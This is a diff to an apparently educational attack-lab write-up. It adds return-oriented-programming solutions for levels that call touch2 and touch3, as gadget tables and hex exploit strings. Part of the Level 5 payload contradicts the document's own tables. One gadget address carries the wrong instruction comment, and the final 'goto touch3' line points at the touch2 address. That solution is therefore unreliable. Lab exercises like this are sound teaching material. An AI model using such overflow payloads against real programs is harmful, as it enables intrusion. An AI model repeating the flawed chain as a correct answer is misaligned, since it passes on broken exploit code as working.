@@ -83,7 +83,7 @@ bf d0 5f 68 55 c3       /* exploit code */
 ```
 
 ## Level 4
-- touch4 address: 0x00000000004017ec
+- touch2 address: 0x00000000004017ec
 
 | Address   | Operation |
 | -------- | ------- | 
@@ -102,5 +102,48 @@ bf d0 5f 68 55 c3       /* exploit code */
 ab 19 40 00 00 00 00 00 /* popq %rax */
 fa 97 b9 59 00 00 00 00 /* cookie value */
 a2 19 40 00 00 00 00 00 /* movq %rax, %rdi */
+ec 17 40 00 00 00 00 00 /* goto touch2 */
+```
+
+## Level 5
+- touch3 address: 0x00000000004018fa
+
+| Address   | Operation |
+| -------- | ------- | 
+| 4019a2    | movq %rax, %rdi    |
+| 401a06    | movq %rsp, %rax    |
+| 4019dd    | movl %eax, %edx    |
+| 401a34    | movl %edx, %ecx    |
+| 401a13    | movl %ecx, %esi    |
+| 4019ab    | popq %rax    |
+
+- Useful function: add_xy, address: 0x00000000004019d6
+
+**String**:
+```
+/* 0x28 filler characters */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Get offset and move it to %rsi */
+ab 19 40 00 00 00 00 00 /* popq %rax, %rax = offset value */
+40 00 00 00 00 00 00 00 /* offset value = 0x40 */
+dd 19 40 00 00 00 00 00 /* movl %eax, %edx */
+34 1a 40 00 00 00 00 00 /* movl %edx, %ecx */
+13 1a 40 00 00 00 00 00 /* movl %ecx, %esi */
+
+/* Get pointer to 2 lines below this one, add it to offset to get the pointer to cookie string */
+ab 19 40 00 00 00 00 00 /* movq %rsp, %rax */
+a2 19 40 00 00 00 00 00 /* movq %rax, %rdi */
+d6 19 40 00 00 00 00 00 /* goto add_xy */
+
+a2 19 40 00 00 00 00 00 /* movq %rax, %rdi */
 ec 17 40 00 00 00 00 00 /* goto touch3 */
+
+/* cookie string */
+35 39 62 39 39 37 66 61
+00
 ```
